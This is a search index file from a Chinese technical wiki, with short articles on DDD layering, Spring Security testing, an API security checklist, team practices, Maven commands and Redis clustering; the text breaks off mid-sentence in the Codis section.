<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>基于 DDD 理论基础的分层架构</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/ddd-layer/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/ddd-layer/</url>
      
        <content type="html"><![CDATA[<p>主要参考下层，唯一不认同的是组件划分的方式，每层的分包逻辑肯定不一定样</p><h2 id="分层参考"><a href="#分层参考" class="headerlink" title="分层参考"></a>分层参考</h2><ul><li>接口层 <ul><li>关心视图和对外的服务</li><li>如果我们没有多种接入方式，可以和应用层合并</li><li>对应到分布式系统中的网关、BFF、前台等概念</li></ul></li><li>应用层 <ul><li>关心处理完一个完整的业务</li><li>集成不同的领域模型解决问题</li><li>一致性事务放到这层</li><li>对应到分布式系统中的中台等概念</li><li>基础设施的 interface 放到这层</li><li>读模型放到这层</li><li>权限控制放到这层</li></ul></li><li>领域层<ul><li>不关心业务，关心模型，</li><li>强事务放到这层</li><li>对应到分布式系统中的 domain service、后台等概念</li><li>按照聚合根分包</li><li>聚合根之间不互相依赖，依赖由应用层编排</li></ul></li><li>基础设施层<ul><li>关心存储、通知和外部设施</li><li>一般由 ORM 提供</li><li>按照 adapter 分包</li></ul></li></ul><h2 id="分布式系统的分层适用性"><a href="#分布式系统的分层适用性" class="headerlink" title="分布式系统的分层适用性"></a>分布式系统的分层适用性</h2><p>分层部署的代价和收益，每层的部署关系：</p><ul><li>单体<ul><li>所有层部署到一起</li><li>收益为部署简单、无分布式事务问题，用户权限简单</li><li>代价为无法解耦</li><li>适合小型工程，无需适配多端、多类型应用</li><li>无需分布式鉴权</li></ul></li><li>小型服务化项目<ul><li>接口层单独部署，例如 admin、mobile、h5</li><li>应用层、领域层、基础设施层部署到一起</li><li>收益为可以一定程度上解耦</li><li>一定程度上无需处理分布式事务</li><li>接口层和应用层使用 OAuth 分布式鉴权</li></ul></li><li>大型中台项目<ul><li>接口层单独部署</li><li>应用层单独部署</li><li>领域层和基础设施层部署到一起</li><li>接口层和应用层使用 OAuth 分布式鉴权</li><li>应用层和领域层使用 AK/SK 服务间鉴权</li></ul></li><li>超大型项目<ul><li>接口层单独部署</li><li>应用层单独部署</li><li>领域层单独部署</li><li>基础设施层部署</li><li>接口层和应用层使用 OAuth 分布式鉴权</li><li>应用层和领域层使用 AK/SK 服务间鉴权</li><li>领域层和基础设施层 使用 AK/SK 服务间鉴权</li></ul></li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.jianshu.com/p/d3e8b9ac097b" target="_blank" rel="noopener">https://www.jianshu.com/p/d3e8b9ac097b</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用 spring-security-test 作为 user mock</title>
      <link href="/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/spring-security-test/"/>
      <url>/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/spring-security-test/</url>
      
        <content type="html"><![CDATA[<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><pre><code>this.mockMvc = MockMvcBuilders        .webAppContextSetup(this.wac)        .alwaysDo(MockMvcResultHandlers.print())        .apply(springSecurity()) // 让 springSecurityFilterChain 生效        .build();</code></pre><h2 id="注解使用"><a href="#注解使用" class="headerlink" title="注解使用"></a>注解使用</h2><p>springSecurity提供了相关的组件spring-security-test，该组件提供了相关的注解来来<em>模拟用户登录信息</em>或者<em>调用用户登录的方法</em>，</p><ul><li>@WithMockUser 模拟用户，手动指定用户名和授权</li><li>@WithAnonymousUser 模拟匿名用户</li><li>@WithUserDetails 模拟用户，给定用户名，通过自定义UserDetails来认证</li><li>@WithSecurityContext 通过SecurityContext构造器模拟用户</li></ul><h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><ul><li>官方文档（<a href="https://docs.spring.io/spring-security/site/docs/5.0.6.RELEASE/reference/htmlsingle/#test-method-withmockuser）" target="_blank" rel="noopener">https://docs.spring.io/spring-security/site/docs/5.0.6.RELEASE/reference/htmlsingle/#test-method-withmockuser）</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 质量保证 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>单体应用 IAM 方案</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/stand-alone-iam-solution/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/stand-alone-iam-solution/</url>
      
        <content type="html"><![CDATA[<h2 id="有-session-方案"><a href="#有-session-方案" class="headerlink" title="有 session 方案"></a>有 session 方案</h2><p>spring-security</p><p>spring-session</p><p>Spring-session-redis</p><p>优点：</p><ul><li>有 http-only 保护比较安全</li></ul><p>缺点</p><ul><li>不满足移动端等场景</li></ul><h2 id="无-session-方案"><a href="#无-session-方案" class="headerlink" title="无 session 方案"></a>无 session 方案</h2><h3 id="jwt-方案"><a href="#jwt-方案" class="headerlink" title="jwt 方案"></a>jwt 方案</h3><h3 id="自定义-token-方案"><a href="#自定义-token-方案" class="headerlink" title="自定义 token 方案"></a>自定义 token 方案</h3>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>开发安全的 API 所需要核对的清单</title>
      <link href="/%E5%AE%89%E5%85%A8/security/api-security/"/>
      <url>/%E5%AE%89%E5%85%A8/security/api-security/</url>
      
        <content type="html"><![CDATA[<h2 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2><ul><li>[ ] 不要使用 <code>Basic Auth</code> 使用标准的认证协议 (如 JWT, OAuth).</li><li>[ ] 不要重新实现 <code>Authentication</code>, <code>token generating</code>, <code>password storing</code>, 使用标准库.</li><li>[ ] 限制密码错误尝试次数，并且增加账号冻结功能.</li><li>[ ] 加密所有的敏感数据.</li></ul><h3 id="JWT-JSON-Web-Token"><a href="#JWT-JSON-Web-Token" class="headerlink" title="JWT (JSON Web Token)"></a>JWT (JSON Web Token)</h3><ul><li>[ ] 使用随机复杂的密钥 (<code>JWT Secret</code>) 以增加暴力破解的难度.</li><li>[ ] 不要在请求体中直接提取数据, 要对数据进行加密 (<code>HS256</code> 或 <code>RS256</code>).</li><li>[ ] 使 token 的过期时间尽量的短 (<code>TTL</code>, <code>RTTL</code>).</li><li>[ ] 不要在 JWT 的请求体中存放敏感数据, 它是<a href="https://jwt.io/#debugger-io" target="_blank" rel="noopener">可解码的</a>.</li></ul><h3 id="OAuth-授权或认证协议"><a href="#OAuth-授权或认证协议" class="headerlink" title="OAuth 授权或认证协议"></a>OAuth 授权或认证协议</h3><ul><li>[ ] 始终在后台验证 <code>redirect_uri</code>, 只允许白名单的 URL.</li><li>[ ] 始终在授权时使用有效期较短的授权码（code）而不是令牌（access_token） (不允许 <code>response_type=token</code>).</li><li>[ ] 使用随机哈希数的 <code>state</code> 参数来防止跨站请求伪造(CSRF).</li><li>[ ] 对不同的应用分别定义默认的作用域和各自有效的作用域参数.</li></ul><h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><ul><li>[ ] 限制流量来防止 DDoS 攻击和暴力攻击.</li><li>[ ] 在服务端使用 HTTPS 协议来防止 MITM （中间人攻击）.</li><li>[ ] 使用 <code>HSTS</code> 协议防止 SSL Strip 攻击.</li></ul><h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><ul><li>[ ] 使用与操作相符的 HTTP 操作函数, <code>GET (读取)</code>, <code>POST (创建)</code>, <code>PUT (替换/更新)</code> 以及 <code>DELETE (删除记录)</code>, 如果请求的方法不适用于请求的资源则返回 <code>405 Method Not Allowed</code>.</li><li>[ ] 在请求头中的 <code>content-type</code> 字段使用内容验证来只允许支持的格式 (如 <code>application/xml</code>, <code>application/json</code> 等等) 并在不满足条件的时候返回 <code>406 Not Acceptable</code>.</li><li>[ ] 验证 <code>content-type</code> 中申明的编码和你收到正文编码一致 (如 <code>application/x-www-form-urlencoded</code>, <code>multipart/form-data</code>, <code>application/json</code> 等等).</li><li>[ ] 验证用户输入来避免一些普通的易受攻击缺陷 (如 <code>XSS</code>, <code>SQL-注入</code>, <code>远程代码执行</code> 等等).</li><li>[ ] 不要在 URL 中使用任何敏感的数据 (<code>credentials</code>, <code>Passwords</code>, <code>security tokens</code>, or <code>API keys</code>), 而是使用标准的认证请求头.</li><li>[ ] 使用一个 API Gateway 服务来启用缓存、限制访问速率 (如 <code>Quota</code>, <code>Spike Arrest</code>, <code>Concurrent Rate Limit</code>) 以及动态地部署 APIs resources.</li></ul><h2 id="处理"><a href="#处理" class="headerlink" title="处理"></a>处理</h2><ul><li>[ ] 检查是否所有的接口都包含必要都身份认证, 以避免被破坏了的认证体系.</li><li>[ ] 避免使用特有的资源 id. 使用 <code>/me/orders</code> 替代 <code>/user/654321/orders</code>.</li><li>[ ] 使用 <code>UUID</code> 代替自增长的 id.</li><li>[ ] 如果需要解析 XML 文件, 确保实体解析(entity parsing)是关闭的以避免 <code>XXE</code> 攻击.</li><li>[ ] 如果需要解析 XML 文件, 确保实体扩展(entity expansion)是关闭的以避免通过指数实体扩展攻击实现的 <code>Billion Laughs/XML bomb</code>.</li><li>[ ] 在文件上传中使用 CDN.</li><li>[ ] 如果数据处理量很大, 尽可能使用队列或者 Workers 在后台处理来避免阻塞请求，从而快速响应客户端.</li><li>[ ] 不要忘了把 DEBUG 模式关掉.</li></ul><h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><ul><li>[ ] 增加请求返回头 <code>X-Content-Type-Options: nosniff</code>.</li><li>[ ] 增加请求返回头 <code>X-Frame-Options: deny</code>.</li><li>[ ] 增加请求返回头 <code>Content-Security-Policy: default-src &#39;none&#39;</code>.</li><li>[ ] 删除请求返回中的指纹头 - <code>X-Powered-By</code>, <code>Server</code>, <code>X-AspNet-Version</code> 等等.</li><li>[ ] 在响应中遵循请求的 <code>content-type</code>, 如果你的请求类型是 <code>application/json</code> 那么你返回的 <code>content-type</code> 就是 <code>application/json</code>.</li><li>[ ] 不要返回敏感的数据, 如 <code>credentials</code>, <code>Passwords</code>, <code>security tokens</code>.</li><li>[ ] 给请求返回使用合理的 HTTP 响应代码. (如 <code>200 OK</code>, <code>400 Bad Request</code>, <code>401 Unauthorized</code>, <code>405 Method Not Allowed</code> 等等).</li></ul><h2 id="持续集成和持续部署"><a href="#持续集成和持续部署" class="headerlink" title="持续集成和持续部署"></a>持续集成和持续部署</h2><ul><li>[ ] 使用单元测试以及集成测试的覆盖率来保障你的设计和实现.</li><li>[ ] 引入代码审查流程, 禁止私自合并代码.</li><li>[ ] 在推送到生产环境之前确保服务的所有组件都用杀毒软件静态地扫描过, 包括第三方库和其它依赖.</li><li>[ ] 为部署设计一个回滚方案.</li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://github.com/shieldfy/API-Security-Checklist" target="_blank" rel="noopener">https://github.com/shieldfy/API-Security-Checklist</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>估点</title>
      <link href="/team/team/estimation/"/>
      <url>/team/team/estimation/</url>
      
        <content type="html"><![CDATA[<ul><li>国内项目和offshore项目不同之处在于，国内项目偏向于按照1人天的工作量作为一个点，而offshore项目偏向于使用复杂度来估点，这里以复杂度为例。</li><li>使用一个点的故事卡作为估点的基准</li><li>使用斐波那契数列1 2 3 5 8 来进行估点</li><li>一旦有故事卡超过了5个点，需要进行拆分</li><li>bug卡的内容已经被普通故事卡覆盖，不进行估点</li><li>项目中遗留的缺陷（例如其他团队交接的）可以进行估点</li><li>技术债卡应和TL一起估点，并让BA知晓</li><li>估点时不计入BA的工作量</li><li>估点时需要考虑QA的工作量</li><li>估点时需要一致通过，否则应阐述分歧时，识别工作量的风险 （不使用少数服从多数，是因为估点不同的人可能了解的信息不同，应该及时识别这些信息）</li><li><strong>预留足够的 buffer</strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> team </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Retro</title>
      <link href="/team/team/retro/"/>
      <url>/team/team/retro/</url>
      
        <content type="html"><![CDATA[<p>Retro 这部分说的东西较少，在项目上 Retro 的形式比较简单，往往使用Well、Less well、Suggestion几个维度。</p><ul><li>Retro 的周期为一个迭代完成或者一个项目完成，也可以不定期进行专项Retro</li><li>Retro 可以提前收集反馈，使用表单工具或者Retro 卡墙 <a href="https://funretro.io/" target="_blank" rel="noopener">https://funretro.io/</a></li><li>Retro 环境应该是匿名和安全的</li><li>使用5-10分钟进行回顾和检查上一次Retro的Actions</li><li>使用10分钟左右提出反馈，一张卡片（无论是电子还是物理墙）记录一个反馈</li><li>收集完反馈后应进行归类</li><li>Retro 时间不够无法完全讨论时，使用投票选出优先级高的话题</li><li>讨论的话题如果需要改进，应该有Action产出</li><li>Action 需要明确的指定 Owner</li></ul><p>Retro 的形式除了使用 Well、Less well这种维度划分方式之外，还可以使用其他的方式，例如“Anchors and Engine” 可以用来收集项目的健康状况和风险。</p><p>网站 <a href="http://www.funretrospectives.com/" target="_blank" rel="noopener">http://www.funretrospectives.com/</a>  提供了各种各样的Retro形式，包括 “Anchors and Engine”。</p>]]></content>
      
      
      <categories>
          
          <category> team </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>站会</title>
      <link href="/team/team/standup/"/>
      <url>/team/team/standup/</url>
      
        <content type="html"><![CDATA[<ul><li>站会的主持人轮流进行，主持人应提前10分钟准备接入的设备</li><li>主持人视情况而定选择站会方式，优先选择使用卡墙模式。</li><li>卡墙模式。使用电子墙或者物理墙，根据卡墙的内容发言，从Done开始到Backlog结束。优点是所有    人不得不集中精力到卡墙上，信息得到很好地同步，不会遗漏信息；坏处是这种方式比较费时间。</li><li>Roll Call 模式，团队成员轮流发言。好处是节省时间，如果工作在多张卡上；可以快速完成站会，坏处是没有集中到故事卡的焦点，注意力非常容易丢失。</li><li>使用Roll Call 模式时，发言者的更新应提及卡号、故事卡内容、进度和当天的工作计划</li><li>主持人可以使用‘正’字记录故事卡的实际工作耗时</li><li>PM更新内容需要包括项目健康程度、进度、关键时间节点</li></ul>]]></content>
      
      
      <categories>
          
          <category> team </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>安全</title>
      <link href="/team/team/security/"/>
      <url>/team/team/security/</url>
      
        <content type="html"><![CDATA[<h2 id="安全军规"><a href="#安全军规" class="headerlink" title="安全军规"></a>安全军规</h2><h3 id="团队成员日常安全"><a href="#团队成员日常安全" class="headerlink" title="团队成员日常安全"></a>团队成员日常安全</h3><ul><li>不对屏幕拍照</li><li>不在便利贴上书写密码</li></ul><h2 id="参考材料"><a href="#参考材料" class="headerlink" title="参考材料"></a>参考材料</h2><ul><li><a href="https://wiki.printf.cn/安全/security/red-line/">https://wiki.printf.cn/%E5%AE%89%E5%85%A8/security/red-line/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> team </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>项目交接</title>
      <link href="/team/team/handover/"/>
      <url>/team/team/handover/</url>
      
        <content type="html"><![CDATA[<ul><li><p>凭证</p></li><li><p>干系人</p></li><li><p>架构</p></li><li><p>代码仓库</p></li><li><p>文档</p></li><li><p>基础设施</p></li><li><p>业务</p></li><li><p>测试用例</p></li><li><p>未完成的功能</p></li><li><p>技术债</p></li><li><p>团队资产 </p></li></ul>]]></content>
      
      
      <categories>
          
          <category> team </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>新成员培训</title>
      <link href="/team/team/on-boarding/"/>
      <url>/team/team/on-boarding/</url>
      
        <content type="html"><![CDATA[<ul><li>介绍客户和项目的背景</li><li>介绍团队成员和项目干系人</li><li>介绍当前项目进度和关键时间节点</li><li>介绍团队中使用的文档和工具</li><li>权限和账号检查</li><li>业务上下文</li><li>业务场景</li><li>用户群体</li><li>技术上下文</li><li>技术栈</li><li>开发工具和环境</li><li>第三方依赖</li></ul>]]></content>
      
      
      <categories>
          
          <category> team </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>上线清单</title>
      <link href="/team/team/release/"/>
      <url>/team/team/release/</url>
      
        <content type="html"><![CDATA[<ol><li>上线前<ul><li>提前发送业务中断信息，包括邮件和悬挂系统通知</li><li>准备部署脚本 （例如 shell、ansible）和线上配置文件（例如Nginx配置）</li><li>制定上线计划</li><li>在低版本演练上线计划</li><li>在低版本演练灾备恢复</li><li>需要准备好回退计划</li><li>有条件的，进行安全测试</li></ul></li><li><p>上线</p><ul><li>执行上线动作至少需要两人pair操作（大量误操作造成事故的案例），可以创建线上会议直播上线操作</li><li>停服后需要监控数据流量，确保流量为0后再进行数据、配置和线上软件包的备份</li><li>上线失败后使用回退计划</li><li>尽量不对线上环境进行手动配置，如果无法实现自动化部署，应添加到上线计划中</li></ul></li><li>上线完成后<ul><li>使用专用的Health check接口检查系统健康状态</li><li>核对线上系统的版本号是否和预期一致</li><li>检查服务器负载是否在健康范围内</li><li>其他授权下的线上测试</li><li>检查日志平台是否有日志到达</li><li>检查日志中是否有错误信息</li><li>发送业务恢复邮件和系统通知</li><li>上线完成后，需要当前线上环境的信息更新文档</li><li>新的IP地址、服务器配置信息等</li><li>最新线上的版本号、软件包、配置文件</li><li>上线计划</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> team </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>代码风格清单</title>
      <link href="/team/team/code-style/"/>
      <url>/team/team/code-style/</url>
      
        <content type="html"><![CDATA[<h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>《核心网编程军规》</p><p>《java 解惑》</p><p>《代码整洁之道》</p><p>《核心网java编程军规》</p><h2 id="Javascript"><a href="#Javascript" class="headerlink" title="Javascript"></a>Javascript</h2>]]></content>
      
      
      <categories>
          
          <category> team </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>codereview 清单</title>
      <link href="/team/team/codereview/"/>
      <url>/team/team/codereview/</url>
      
        <content type="html"><![CDATA[<ul><li>如果没有特别重要的事务，坚持每日Codereview</li><li>推荐使用的Jetbrains IDE中提供的版本管理工具，可以筛选提交人和一次性diff当天所有提交，不建议逐commit diff</li><li>Codereview 讨论实现方法、传递业务，避免逐行讲代码和现场debug</li><li>每人Codereview时间不超过10分钟，时间需自行控制，细节可以私下讨论</li><li>委托他人记录检查点</li></ul><h3 id="Vue-技术栈"><a href="#Vue-技术栈" class="headerlink" title="Vue 技术栈"></a>Vue 技术栈</h3><ul><li>单词拼写错误（Typo）和无意义、不统一的变量名</li><li>脏代码，无意义的注释、临时代码、console.log等</li><li>混用ES5/6语法特性</li><li>在模板中使用复杂的表达式，应该使用方法代替</li><li>公共组件和状态关联（Redux、Vuex）</li><li>嵌套三元表达式</li><li>大量的switch case或者If语句，应该使用Map代替</li><li>引入无用的依赖</li><li>特性滥用</li><li>Mixin</li><li>Ref</li><li>Vuex</li><li>直接的DOM操作</li><li>不安全特性</li><li>v-html</li><li>Store 引用修改</li><li>大量拷贝的代码或其他不合理的设计和实现</li></ul><h3 id="Java-技术栈"><a href="#Java-技术栈" class="headerlink" title="Java 技术栈"></a>Java 技术栈</h3><p>TODO </p>]]></content>
      
      
      <categories>
          
          <category> team </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>maven 常用命令和插件</title>
      <link href="/maven/devops/maven-basic/"/>
      <url>/maven/devops/maven-basic/</url>
      
        <content type="html"><![CDATA[<h2 id="maven-基本命令"><a href="#maven-基本命令" class="headerlink" title="maven 基本命令"></a>maven 基本命令</h2><p>不安装任何插件的命令</p><ul><li><p>mvn compile:编译，生成 target target里边编译后的class文件</p></li><li><p>mvn clean 清理清 target里边所有文件</p></li><li><p>mvn test-compile 编译test下的类，它首先会编译被测试的类</p></li><li><p>mvn  package 打包，输出 jar 或者 war</p></li><li><p>mvn source:jar  生成源码jar包 ，只打main里边的</p></li><li><p>mvn install 安装命令，把打包成jar包 放到仓库里边，可以被使用</p></li><li><p>mvn deploy 将最终的包复制到远程仓库</p></li></ul><h2 id="常用插件和作用"><a href="#常用插件和作用" class="headerlink" title="常用插件和作用"></a>常用插件和作用</h2><h3 id="maven-release-plugin"><a href="#maven-release-plugin" class="headerlink" title="maven-release-plugin"></a>maven-release-plugin</h3><p>maven release 插件，功能主要有两个:</p><ul><li>修改  pom 文件版本号，提交 git tag</li><li>执行 mvn deploy 将新版本推送到服务器</li></ul>]]></content>
      
      
      <categories>
          
          <category> maven </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>前端工程师知识清单</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/skills/"/>
      <url>/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/skills/</url>
      
        <content type="html"><![CDATA[<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="http://www.itcast.cn/course/web.shtml" target="_blank" rel="noopener">http://www.itcast.cn/course/web.shtml</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端工程 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Nginx 性能优化</title>
      <link href="/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/performance/nginx-performance/"/>
      <url>/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/performance/nginx-performance/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 性能优化 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>MQ 性能优化</title>
      <link href="/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/performance/mysql-performance/"/>
      <url>/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/performance/mysql-performance/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 性能优化 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>MQ 性能优化</title>
      <link href="/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/performance/mq-performance/"/>
      <url>/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/performance/mq-performance/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 性能优化 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Redis 性能优化</title>
      <link href="/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/performance/redis-performance/"/>
      <url>/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/performance/redis-performance/</url>
      
        <content type="html"><![CDATA[<h2 id="Redis-集群原理"><a href="#Redis-集群原理" class="headerlink" title="Redis 集群原理"></a>Redis 集群原理</h2><p>redis 扩容三个阶段：</p><ul><li>单机: redis支撑万级</li><li>一主多从： 一主多从，开启读写分离，例如1主2从3哨兵模式 一般能到10万级，其实本质上还是属于单实例</li><li>多主集群：多主多从，客户端分片 可以达到千万级别</li></ul><h3 id="一主多从模式"><a href="#一主多从模式" class="headerlink" title="一主多从模式"></a>一主多从模式</h3><p>使用 Redis 自带的哨兵（Sentinel）集群对实例进行状态监控与 Failover。Sentinel 是 Redis 自带的高可用组件，将 Redis 注册到由多个 Sentinel 组成的 Sentinel 集群后，Sentinel 会对 Redis 实例进行健康检查，当 Redis 发生故障后，Sentinel 会通过 Gossip 协议进行故障检测，确认宕机后会通过一个简化的 Raft 协议来提升 Slave 成为新的 Master。</p><p><img src="/性能优化/performance/redis-performance/1500839-3bb8dac58b9fac75.jpg" alt="img"></p><p>仅使用 1 个 Slave 节点进行冷备，如果有读写分离请求，可以建立多个 Read only slave 来进行读写分离。</p><p>如上图所示，通过向 Sentinel 集群注册 Master 节点实现实例的高可用，当提交 Master 实例的连接信息后，Sentinel 会主动探测所有的 Slave 实例并建立连接，定期检查健康状态。客户端通过多种资源发现策略如简单的 DNS 发现 Master 节点，将来有计划迁移到如 Consul 或 etcd 等资源发现组件 。</p><p>注意事项：</p><ul><li>只读 Slave 节点可以按照需求设置 slave-priority 参数为 0，防止故障切换时选择了只读节点而不是热备 Slave 节点；</li><li>Sentinel 进行故障切换后会执行 CONFIG REWRITE 命令将 SLAVEOF 配置落地，如果 Redis 配置中禁用了 CONFIG 命令，切换时会发生错误，可以通过修改 Sentinel 代码来替换 CONFIG 命令；</li><li>Sentinel Group 监控的节点不宜过多，实测超过 500 个切换过程偶尔会进入 TILT 模式，导致 Sentinel 工作不正常，推荐部署多个 Sentinel 集群并保证每个集群监控的实例数量小于 300 个；</li><li>Master 节点应与 Slave 节点跨机器部署，有能力的使用方可以跨机架部署，不推荐跨机房部署 Redis 主从实例；</li><li>Sentinel 切换功能主要依赖 down-after-milliseconds 和 failover-timeout 两个参数，down-after-milliseconds 决定了 Sentinel 判断 Redis 节点宕机的超时，使用 30000 作为阈值。而 failover-timeout 则决定了两次切换之间的最短等待时间，如果对于切换成功率要求较高，可以适当缩短 failover-timeout 到秒级保证切换成功，具体详见 Redis 官方文档；</li><li>单机网络故障等同于机器宕机，但如果机房全网发生大规模故障会造成主从多次切换，此时资源发现服务可能更新不够及时，需要人工介入。</li></ul><h3 id="多主集群模式"><a href="#多主集群模式" class="headerlink" title="多主集群模式"></a>多主集群模式</h3><p>redis 目前主流有三个集群方案可以选择：</p><ul><li>redis cluster  官方的集群方案</li><li>Twemproxy 推特、知乎在用</li><li>codis 豌豆荚团队开发</li></ul><h4 id="redis-cluster-官方集群"><a href="#redis-cluster-官方集群" class="headerlink" title="redis cluster 官方集群"></a>redis cluster 官方集群</h4><p>一组Redis Cluster是由多个Redis实例组成，官方推荐我们使用6实例，其中3个为主节点，3个为从结点。</p><p>一旦有主节点发生故障的时候，Redis Cluster可以选举出对应的从结点成为新的主节点，继续对外服务，从而保证服务的高可用性。那么对于客户端来说，知道知道对应的key是要路由到哪一个节点呢？原来，Redis Cluster 把所有的数据划分为16384个不同的槽位，可以根据机器的性能把不同的槽位分配给不同的Redis实例，对于Redis实例来说，他们只会存储部门的Redis数据，当然，槽的数据是可以迁移的，不同的实例之间，可以通过一定的协议，进行数据迁移。</p><p><img src="/性能优化/performance/redis-performance/377adab44aed2e73e06d2f3d2de6fe8e86d6fa0c.png" alt="img"></p><p>客户端是如何访问Redis Cluster里面的数据呢？首先客户端需要保存一份Redis Cluster槽相关的信息，也就是路由表，然后对即将访问的key进行哈希计算，计算出对应的槽位，然后向对应的Redis实例发起查询请求。如果访问的Redis实例中，的确保存着对应槽的数据信息，就会进行返回，否则向客户端返回一个Moved指令，让客户端到正确的地址进行获取。</p><h5 id="槽位算法"><a href="#槽位算法" class="headerlink" title="槽位算法"></a>槽位算法</h5><p>槽位的信息是通过 CRC16 实现的，如果给 key 增加 tag 还可以强制 key 所挂的操作等于 tag 所在的槽位。</p><pre><code class="shell">&gt; CLUSTER KEYSLOT somekey11058&gt; CLUSTER KEYSLOT foo{hash_tag}(integer) 2515&gt; CLUSTER KEYSLOT bar{hash_tag}(integer) 2515</code></pre><p>参考文档：<a href="https://redis.io/commands/cluster-keyslot" target="_blank" rel="noopener">https://redis.io/commands/cluster-keyslot</a></p><h5 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h5><p>当客户端向一个错误的节点发出指令后，该节点就会发现该指令的 key 所在的槽位并不归自己管理，这时服务器会发送一个特殊的跳转指令，告诉客户端去连接新的节点获取数据。</p><pre><code class="shell">GET X-MOVED 3333 127.0.0.1:6381</code></pre><h5 id="迁移"><a href="#迁移" class="headerlink" title="迁移"></a>迁移</h5><p>如果需要对集群中的 keys 迁移到另外一个服务器，可以使用 redis-trib 工具，该工具是由 ruby 编写，可以方便的完成迁移工作。</p><h5 id="容错"><a href="#容错" class="headerlink" title="容错"></a>容错</h5><p>Redis 集群可以为每个主节点设置多个从节点，当主节点发生故障，集群可以将其中一个节点提升为主节点。</p><h5 id="网络抖动设置"><a href="#网络抖动设置" class="headerlink" title="网络抖动设置"></a>网络抖动设置</h5><p>现实的网络会发生抖动，也就是偶尔不可达，但随后能通信，因此需要一个阈值决定是否真的发生了宕机。</p><p>这个值可以设置:</p><blockquote><p>Cluster-slave-validity-factor</p></blockquote><p>如果这个值为 0  集群不会抗拒网络抖动，会发生主从切换，如果这个值大于0，集群会通过重试确认主从。</p><h4 id="codis"><a href="#codis" class="headerlink" title="codis"></a>codis</h4><p>Codis是一个分布式Redis解决方案,对于上层的应用来说,连接到Codis Proxy和连接原生的RedisServer没有明显的区别,有部分命令不支持。Codis底层会处理请求的转发,不停机的数据迁移等工作,所有后边的一切事情,对于前面的客户端来说是透明的,可以简单的认为后边连接的是一个内存无限大的Redis服务.</p><p><img src="/性能优化/performance/redis-performance/5BD68FB50A584D53A186F0FC5C81212D.png" alt="image"></p><p>codis 组成部分：</p><ul><li>Codis-proxy: 实现redis协议,由于本身是无状态的,因此可以部署很多个节点</li><li>Codis-config :是codis的管理工具,包括添加/删除redis节点添加删除proxy节点,发起数据迁移等操作,自带httpserver,支持管理后台方式管理配置</li><li>Codis-server :是codis维护的redis分支,基于2.8.21分支,加入了slot的支持和原子的数据迁移指令; codis-proxy和codis-config只能和这个版本的redis交互才能正常运行</li><li>Coordination：支持 Zookeeper 或者 etcd</li></ul><p>使用 codis 